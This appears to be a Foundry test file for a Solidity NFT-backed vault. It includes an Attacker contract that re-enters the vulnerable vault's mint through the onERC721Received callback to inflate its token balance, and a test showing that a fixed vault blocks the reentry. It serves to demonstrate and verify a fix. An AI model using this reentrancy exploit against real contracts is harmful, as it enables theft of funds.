// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
import "../src/VulnerableBROVault.sol";
import "../src/FixedBROVault.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
contract Attacker is IERC721Receiver {
    MockNFT nft; VulnerableBROVault vault; uint256 loops;
    constructor(address _nft,address _vault){ nft=MockNFT(_nft); vault=VulnerableBROVault(_vault); }
    function attack(uint256 id) external { vault.mint(id); }
    function onERC721Received(address,address,uint256,bytes calldata) external override returns(bytes4){
        if(loops++<22){ uint256 id=nft.mint(address(this)); nft.approve(address(vault),id); vault.mint(id); }
        return IERC721Receiver.onERC721Received.selector;
    }
}
contract BROVaultTest is Test {
    MockNFT nft; VulnerableBROVault vuln; FixedBROVault fixed_;
    function setUp() public { nft=new MockNFT(); vuln=new VulnerableBROVault(address(nft)); fixed_=new FixedBROVault(address(nft)); }
    function test_VulnDoubleMint() public {
        Attacker atk=new Attacker(address(nft),address(vuln));
        uint256 id=nft.mint(address(atk)); atk.attack(id);
        uint256 bal=vuln.broBalance(address(atk));
        emit log_named_uint("Attacker BRO",bal);
        emit log_named_uint("Legitimate  ",vuln.RATE());
        emit log_named_uint("Inflation x ",bal/vuln.RATE());
        assertGt(bal,vuln.RATE());
    }
    function test_FixedBlocksReentry() public {
        uint256 id=nft.mint(address(this)); nft.approve(address(fixed_),id); fixed_.mint(id);
        assertEq(fixed_.broBalance(address(this)),fixed_.RATE());
        emit log_named_uint("Fixed vault ",fixed_.broBalance(address(this)));
    }
}
